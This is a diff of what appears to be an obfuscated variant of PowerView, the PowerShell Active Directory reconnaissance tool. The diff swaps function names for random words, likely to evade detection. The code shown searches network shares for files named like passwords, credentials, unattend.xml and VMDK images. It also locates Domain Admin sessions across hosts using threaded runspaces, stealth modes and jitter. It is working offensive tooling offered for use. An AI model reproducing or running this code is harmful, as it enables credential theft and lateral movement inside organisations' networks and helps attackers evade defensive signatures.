+                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
+                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
+                    $Process | Add-Member Noteproperty 'User' $Owner.User
+                    $Process.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
+                    $Process
                 }
             }
             catch {
-                Write-Verbose "[console] Error enumerating remote processes on '$cXOPCAwl99', access likely denied: $_"
+                Write-Verbose "[frontiersman] Error enumerating remote processes on '$Computer', access likely denied: $_"
             }
         }
     }
 }
-function overlapping {
+function motherless {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.FoundFile')]
     [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
@@ -7863,57 +7863,57 @@ function overlapping {
         [ValidateNotNullOrEmpty()]
         [Alias('SearchTerms', 'Terms')]
         [String[]]
-        $CuygeMzO99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
+        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
         [Parameter(ParameterSetName = 'FileSpecification')]
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $uKMZoAej99,
+        $LastAccessTime,
         [Parameter(ParameterSetName = 'FileSpecification')]
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $QRdxeHwL99,
+        $LastWriteTime,
         [Parameter(ParameterSetName = 'FileSpecification')]
         [ValidateNotNullOrEmpty()]
         [DateTime]
-        $rZqUJwQL99,
+        $CreationTime,
         [Parameter(ParameterSetName = 'OfficeDocs')]
         [Switch]
-        $DXnIJKyo99,
+        $OfficeDocs,
         [Parameter(ParameterSetName = 'FreshEXEs')]
         [Switch]
-        $KMUtBgIc99,
+        $FreshEXEs,
         [Parameter(ParameterSetName = 'FileSpecification')]
         [Switch]
-        $gnQjzbyA99,
+        $ExcludeFolders,
         [Parameter(ParameterSetName = 'FileSpecification')]
         [Switch]
-        $dnROoQma99,
+        $ExcludeHidden,
         [Switch]
-        $SbmYKKRw99,
+        $CheckWriteAccess,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 =  @{
+        $SearcherArguments =  @{
             'Recurse' = $True
             'ErrorAction' = 'SilentlyContinue'
-            'Include' = $CuygeMzO99
+            'Include' = $Include
         }
         if ($PSBoundParameters['OfficeDocs']) {
-            $PPosolen99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
+            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
         }
         elseif ($PSBoundParameters['FreshEXEs']) {
-            $uKMZoAej99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
-            $PPosolen99['Include'] = @('*.exe')
+            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
+            $SearcherArguments['Include'] = @('*.exe')
         }
-        $PPosolen99['Force'] = -not $PSBoundParameters['ExcludeHidden']
-        $nFPezvSf99 = @{}
-        function saintlier {
+        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']
+        $MappedComputers = @{}
+        function rotting {
             [CmdletBinding()]Param([String]$Path)
             try {
-                $zxVENVbO99 = [IO.File]::OpenWrite($Path)
-                $zxVENVbO99.Close()
+                $Filetest = [IO.File]::OpenWrite($Path)
+                $Filetest.Close()
                 $True
             }
             catch {
@@ -7922,35 +7922,35 @@ function overlapping {
         }
     }
     PROCESS {
-        ForEach ($VfipJrPp99 in $Path) {
-            if (($VfipJrPp99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
-                $GVmMliRp99 = (New-Object System.Uri($VfipJrPp99)).Host
-                if (-not $nFPezvSf99[$GVmMliRp99]) {
-                    distinctively -ComputerName $GVmMliRp99 -Credential $gxazvivN99
-                    $nFPezvSf99[$GVmMliRp99] = $True
+        ForEach ($TargetPath in $Path) {
+            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
+                $HostComputer = (New-Object System.Uri($TargetPath)).Host
+                if (-not $MappedComputers[$HostComputer]) {
+                    depicting -ComputerName $HostComputer -Credential $Credential
+                    $MappedComputers[$HostComputer] = $True
                 }
             }
-            $PPosolen99['Path'] = $VfipJrPp99
+            $SearcherArguments['Path'] = $TargetPath
             Get-ChildItem @SearcherArguments | ForEach-Object {
-                $QNmOTPuW99 = $True
+                $Continue = $True
                 if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                     Write-Verbose "Excluding: $($_.FullName)"
-                    $QNmOTPuW99 = $False
+                    $Continue = $False
                 }
-                if ($uKMZoAej99 -and ($_.LastAccessTime -lt $uKMZoAej99)) {
-                    $QNmOTPuW99 = $False
+                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
+                    $Continue = $False
                 }
-                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $QRdxeHwL99)) {
-                    $QNmOTPuW99 = $False
+                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {
+                    $Continue = $False
                 }
-                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $rZqUJwQL99)) {
-                    $QNmOTPuW99 = $False
+                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {
+                    $Continue = $False
                 }
-                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (saintlier -Path $_.FullName))) {
-                    $QNmOTPuW99 = $False
+                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (rotting -Path $_.FullName))) {
+                    $Continue = $False
                 }
-                if ($QNmOTPuW99) {
-                    $pkyHbWCb99 = @{
+                if ($Continue) {
+                    $FileParams = @{
                         'Path' = $_.FullName
                         'Owner' = $((Get-Acl $_.FullName).Owner)
                         'LastAccessTime' = $_.LastAccessTime
@@ -7958,101 +7958,101 @@ function overlapping {
                         'CreationTime' = $_.CreationTime
                         'Length' = $_.Length
                     }
-                    $oVtXcgLd99 = New-Object -TypeName PSObject -Property $pkyHbWCb99
-                    $oVtXcgLd99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
-                    $oVtXcgLd99
+                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
+                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
+                    $FoundFile
                 }
             }
         }
     }
     END {
-        $nFPezvSf99.Keys | reeling
+        $MappedComputers.Keys | withdrew
     }
 }
-function glorious {
+function wingnut {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [Parameter(Position = 1, Mandatory = $True)]
         [System.Management.Automation.ScriptBlock]
-        $yosqyblr99,
+        $ScriptBlock,
         [Parameter(Position = 2)]
         [Hashtable]
-        $lWgFMRFK99,
+        $ScriptParameters,
         [Int]
         [ValidateRange(1,  100)]
-        $wCkPnMUb99 = 20,
+        $Threads = 20,
         [Switch]
-        $VFZGebhX99
+        $NoImports
     )
     BEGIN {
-        $HoILwanz99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
-        $HoILwanz99.ApartmentState = [System.Threading.ApartmentState]::STA
-        if (-not $VFZGebhX99) {
-            $pdFOWRTO99 = Get-Variable -Scope 2
-            $yRgTwRAU99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
-            ForEach ($Var in $pdFOWRTO99) {
-                if ($yRgTwRAU99 -NotContains $Var.Name) {
-                $HoILwanz99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
+        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
+        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA
+        if (-not $NoImports) {
+            $MyVars = Get-Variable -Scope 2
+            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
+            ForEach ($Var in $MyVars) {
+                if ($VorbiddenVars -NotContains $Var.Name) {
+                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                 }
             }
-            ForEach ($CRRJdwmM99 in (Get-ChildItem Function:)) {
-                $HoILwanz99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $CRRJdwmM99.Name, $CRRJdwmM99.Definition))
+            ForEach ($Function in (Get-ChildItem Function:)) {
+                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
             }
         }
-        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $wCkPnMUb99, $HoILwanz99, $Host)
+        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
         $Pool.Open()
-        $AlrHOHqQ99 = $Null
+        $Method = $Null
         ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
-            $aTLJkgPI99 = $M.GetParameters()
-            if (($aTLJkgPI99.Count -eq 2) -and $aTLJkgPI99[0].Name -eq 'input' -and $aTLJkgPI99[1].Name -eq 'output') {
-                $AlrHOHqQ99 = $M.MakeGenericMethod([Object], [Object])
+            $MethodParameters = $M.GetParameters()
+            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
+                $Method = $M.MakeGenericMethod([Object], [Object])
                 break
             }
         }
         $Jobs = @()
-        $VrEmrUHq99 = $VrEmrUHq99 | Where-Object {$_ -and $_.Trim()}
-        Write-Verbose "[glorious] Total number of hosts: $($VrEmrUHq99.count)"
-        if ($wCkPnMUb99 -ge $VrEmrUHq99.Length) {
-            $wCkPnMUb99 = $VrEmrUHq99.Length
+        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
+        Write-Verbose "[wingnut] Total number of hosts: $($ComputerName.count)"
+        if ($Threads -ge $ComputerName.Length) {
+            $Threads = $ComputerName.Length
         }
-        $pyUMZySw99 = [Int]($VrEmrUHq99.Length/$wCkPnMUb99)
-        $MDCsFjjc99 = @()
+        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
+        $ComputerNamePartitioned = @()
         $Start = 0
-        $End = $pyUMZySw99
-        for($i = 1; $i -le $wCkPnMUb99; $i++) {
+        $End = $ElementSplitSize
+        for($i = 1; $i -le $Threads; $i++) {
             $List = New-Object System.Collections.ArrayList
-            if ($i -eq $wCkPnMUb99) {
-                $End = $VrEmrUHq99.Length
+            if ($i -eq $Threads) {
+                $End = $ComputerName.Length
             }
-            $List.AddRange($VrEmrUHq99[$Start..($End-1)])
-            $Start += $pyUMZySw99
-            $End += $pyUMZySw99
-            $MDCsFjjc99 += @(,@($List.ToArray()))
+            $List.AddRange($ComputerName[$Start..($End-1)])
+            $Start += $ElementSplitSize
+            $End += $ElementSplitSize
+            $ComputerNamePartitioned += @(,@($List.ToArray()))
         }
-        Write-Verbose "[glorious] Total number of threads/partitions: $wCkPnMUb99"
-        ForEach ($vnwipGpo99 in $MDCsFjjc99) {
-            $gaPOxaEg99 = [PowerShell]::Create()
-            $gaPOxaEg99.runspacepool = $Pool
-            $Null = $gaPOxaEg99.AddScript($yosqyblr99).AddParameter('ComputerName', $vnwipGpo99)
-            if ($lWgFMRFK99) {
-                ForEach ($Param in $lWgFMRFK99.GetEnumerator()) {
-                    $Null = $gaPOxaEg99.AddParameter($Param.Name, $Param.Value)
+        Write-Verbose "[wingnut] Total number of threads/partitions: $Threads"
+        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
+            $PowerShell = [PowerShell]::Create()
+            $PowerShell.runspacepool = $Pool
+            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)
+            if ($ScriptParameters) {
+                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
+                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                 }
             }
-            $ERfozkEO99 = New-Object Management.Automation.PSDataCollection[Object]
+            $Output = New-Object Management.Automation.PSDataCollection[Object]
             $Jobs += @{
-                PS = $gaPOxaEg99
-                Output = $ERfozkEO99
-                Result = $AlrHOHqQ99.Invoke($gaPOxaEg99, @($Null, [Management.Automation.PSDataCollection[Object]]$ERfozkEO99))
+                PS = $PowerShell
+                Output = $Output
+                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
             }
         }
     }
     END {
-        Write-Verbose "[glorious] Threads executing"
+        Write-Verbose "[wingnut] Threads executing"
         Do {
             ForEach ($Job in $Jobs) {
                 $Job.Output.ReadAll()
@@ -8060,9 +8060,9 @@ function glorious {
             Start-Sleep -Seconds 1
         }
         While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
-        $RJiMZTFH99 = 100
-        Write-Verbose "[glorious] Waiting $RJiMZTFH99 seconds for final cleanup..."
-        for ($i=0; $i -lt $RJiMZTFH99; $i++) {
+        $SleepSeconds = 100
+        Write-Verbose "[wingnut] Waiting $SleepSeconds seconds for final cleanup..."
+        for ($i=0; $i -lt $SleepSeconds; $i++) {
             ForEach ($Job in $Jobs) {
                 $Job.Output.ReadAll()
                 $Job.PS.Dispose()
@@ -8070,10 +8070,10 @@ function glorious {
             Start-Sleep -S 1
         }
         $Pool.Dispose()
-        Write-Verbose "[glorious] all threads completed"
+        Write-Verbose "[wingnut] all threads completed"
     }
 }
-function drinkers {
+function rubble {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.UserLocation')]
     [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
@@ -8081,335 +8081,335 @@ function drinkers {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DNSHostName')]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $cdytPdAI99,
+        $ComputerDomain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $glLCVedN99,
+        $ComputerLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $WrwfvIMy99,
+        $ComputerSearchBase,
         [Alias('Unconstrained')]
         [Switch]
-        $MyERHgGv99,
+        $ComputerUnconstrained,
         [ValidateNotNullOrEmpty()]
         [Alias('OperatingSystem')]
         [String]
-        $fGipudMB99,
+        $ComputerOperatingSystem,
         [ValidateNotNullOrEmpty()]
         [Alias('ServicePack')]
         [String]
-        $JKXRZnBu99,
+        $ComputerServicePack,
         [ValidateNotNullOrEmpty()]
         [Alias('SiteName')]
         [String]
-        $GtxmnElz99,
+        $ComputerSiteName,
         [Parameter(ParameterSetName = 'UserIdentity')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $rqcypngr99,
+        $UserIdentity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $ojqqfkye99,
+        $UserDomain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $VlBmNldu99,
+        $UserLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $IXFyKHnF99,
+        $UserSearchBase,
         [Parameter(ParameterSetName = 'UserGroupIdentity')]
         [ValidateNotNullOrEmpty()]
         [Alias('GroupName', 'Group')]
         [String[]]
-        $ZgtvBxHU99 = 'Domain Admins',
+        $UserGroupIdentity = 'Domain Admins',
         [Alias('AdminCount')]
         [Switch]
-        $tUgZHPlx99,
+        $UserAdminCount,
         [Alias('AllowDelegation')]
         [Switch]
-        $KAJorLmv99,
+        $UserAllowDelegation,
         [Switch]
-        $fXeDJWKC99,
+        $CheckAccess,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
-        $DCpfKYOf99,
+        $StopOnSuccess,
         [ValidateRange(1, 10000)]
         [Int]
         $Delay = 0,
         [ValidateRange(0.0, 1.0)]
         [Double]
-        $ohvTlzbv99 = .3,
+        $Jitter = .3,
         [Parameter(ParameterSetName = 'ShowAll')]
         [Switch]
-        $GBWfEvAA99,
+        $ShowAll,
         [Switch]
-        $QDuWiWQb99,
+        $Stealth,
         [String]
         [ValidateSet('DFS', 'DC', 'File', 'All')]
-        $YbzyUYhM99 = 'All',
+        $StealthSource = 'All',
         [Int]
         [ValidateRange(1, 100)]
-        $wCkPnMUb99 = 20
+        $Threads = 20
     )
     BEGIN {
-        $tgaaoeGR99 = @{
+        $ComputerSearcherArguments = @{
             'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters['Domain']) { $tgaaoeGR99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
-        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
-        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
-        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
-        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
-        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
-        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
-        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
-        $xUaDkcfD99 = @{
+        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
+        $UserSearcherArguments = @{
             'Properties' = 'samaccountname'
         }
-        if ($PSBoundParameters['UserIdentity']) { $xUaDkcfD99['Identity'] = $rqcypngr99 }
-        if ($PSBoundParameters['Domain']) { $xUaDkcfD99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['UserDomain']) { $xUaDkcfD99['Domain'] = $ojqqfkye99 }
-        if ($PSBoundParameters['UserLDAPFilter']) { $xUaDkcfD99['LDAPFilter'] = $VlBmNldu99 }
-        if ($PSBoundParameters['UserSearchBase']) { $xUaDkcfD99['SearchBase'] = $IXFyKHnF99 }
-        if ($PSBoundParameters['UserAdminCount']) { $xUaDkcfD99['AdminCount'] = $tUgZHPlx99 }
-        if ($PSBoundParameters['UserAllowDelegation']) { $xUaDkcfD99['AllowDelegation'] = $KAJorLmv99 }
-        if ($PSBoundParameters['Server']) { $xUaDkcfD99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $xUaDkcfD99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $xUaDkcfD99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $xUaDkcfD99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $xUaDkcfD99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $xUaDkcfD99['Credential'] = $gxazvivN99 }
-        $EqAZlVKw99 = @()
+        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
+        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
+        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
+        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
+        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
+        if ($PSBoundParameters['UserAllowDelegation']) { $UserSearcherArguments['AllowDelegation'] = $UserAllowDelegation }
+        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
+        $TargetComputers = @()
         if ($PSBoundParameters['ComputerName']) {
-            $EqAZlVKw99 = @($VrEmrUHq99)
+            $TargetComputers = @($ComputerName)
         }
         else {
             if ($PSBoundParameters['Stealth']) {
-                Write-Verbose "[drinkers] Stealth enumeration using source: $YbzyUYhM99"
-                $LNiELDDv99 = New-Object System.Collections.ArrayList
-                if ($YbzyUYhM99 -match 'File|All') {
-                    Write-Verbose '[drinkers] Querying for file servers'
-                    $DYQQJQqu99 = @{}
-                    if ($PSBoundParameters['Domain']) { $DYQQJQqu99['Domain'] = $SSNUOPgW99 }
-                    if ($PSBoundParameters['ComputerDomain']) { $DYQQJQqu99['Domain'] = $cdytPdAI99 }
-                    if ($PSBoundParameters['ComputerSearchBase']) { $DYQQJQqu99['SearchBase'] = $WrwfvIMy99 }
-                    if ($PSBoundParameters['Server']) { $DYQQJQqu99['Server'] = $mSxqoOjK99 }
-                    if ($PSBoundParameters['SearchScope']) { $DYQQJQqu99['SearchScope'] = $vaSWXjPs99 }
-                    if ($PSBoundParameters['ResultPageSize']) { $DYQQJQqu99['ResultPageSize'] = $mhcqrrQn99 }
-                    if ($PSBoundParameters['ServerTimeLimit']) { $DYQQJQqu99['ServerTimeLimit'] = $mvTbAWDU99 }
-                    if ($PSBoundParameters['Tombstone']) { $DYQQJQqu99['Tombstone'] = $rPozaKft99 }
-                    if ($PSBoundParameters['Credential']) { $DYQQJQqu99['Credential'] = $gxazvivN99 }
-                    $PWOtnDPd99 = furloughing @FileServerSearcherArguments
-                    if ($PWOtnDPd99 -isnot [System.Array]) { $PWOtnDPd99 = @($PWOtnDPd99) }
-                    $LNiELDDv99.AddRange( $PWOtnDPd99 )
+                Write-Verbose "[rubble] Stealth enumeration using source: $StealthSource"
+                $TargetComputerArrayList = New-Object System.Collections.ArrayList
+                if ($StealthSource -match 'File|All') {
+                    Write-Verbose '[rubble] Querying for file servers'
+                    $FileServerSearcherArguments = @{}
+                    if ($PSBoundParameters['Domain']) { $FileServerSearcherArguments['Domain'] = $Domain }
+                    if ($PSBoundParameters['ComputerDomain']) { $FileServerSearcherArguments['Domain'] = $ComputerDomain }
+                    if ($PSBoundParameters['ComputerSearchBase']) { $FileServerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+                    if ($PSBoundParameters['Server']) { $FileServerSearcherArguments['Server'] = $Server }
+                    if ($PSBoundParameters['SearchScope']) { $FileServerSearcherArguments['SearchScope'] = $SearchScope }
+                    if ($PSBoundParameters['ResultPageSize']) { $FileServerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+                    if ($PSBoundParameters['ServerTimeLimit']) { $FileServerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+                    if ($PSBoundParameters['Tombstone']) { $FileServerSearcherArguments['Tombstone'] = $Tombstone }
+                    if ($PSBoundParameters['Credential']) { $FileServerSearcherArguments['Credential'] = $Credential }
+                    $FileServers = witchery @FileServerSearcherArguments
+                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
+                    $TargetComputerArrayList.AddRange( $FileServers )
                 }
-                if ($YbzyUYhM99 -match 'DFS|All') {
-                    Write-Verbose '[drinkers] Querying for DFS servers'
+                if ($StealthSource -match 'DFS|All') {
+                    Write-Verbose '[rubble] Querying for DFS servers'
                 }
-                if ($YbzyUYhM99 -match 'DC|All') {
-                    Write-Verbose '[drinkers] Querying for domain controllers'
-                    $zIQySoxi99 = @{
+                if ($StealthSource -match 'DC|All') {
+                    Write-Verbose '[rubble] Querying for domain controllers'
+                    $DCSearcherArguments = @{
                         'LDAP' = $True
                     }
-                    if ($PSBoundParameters['Domain']) { $zIQySoxi99['Domain'] = $SSNUOPgW99 }
-                    if ($PSBoundParameters['ComputerDomain']) { $zIQySoxi99['Domain'] = $cdytPdAI99 }
-                    if ($PSBoundParameters['Server']) { $zIQySoxi99['Server'] = $mSxqoOjK99 }
-                    if ($PSBoundParameters['Credential']) { $zIQySoxi99['Credential'] = $gxazvivN99 }
-                    $oNVkoMte99 = deplorably @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
-                    if ($oNVkoMte99 -isnot [System.Array]) { $oNVkoMte99 = @($oNVkoMte99) }
-                    $LNiELDDv99.AddRange( $oNVkoMte99 )
+                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
+                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }
+                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
+                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
+                    $DomainControllers = Sarto @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
+                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
+                    $TargetComputerArrayList.AddRange( $DomainControllers )
                 }
-                $EqAZlVKw99 = $LNiELDDv99.ToArray()
+                $TargetComputers = $TargetComputerArrayList.ToArray()
             }
             else {
-                Write-Verbose '[drinkers] Querying for all computers in the domain'
-                $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+                Write-Verbose '[rubble] Querying for all computers in the domain'
+                $TargetComputers = sonorous @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
             }
         }
-        Write-Verbose "[drinkers] TargetComputers length: $($EqAZlVKw99.Length)"
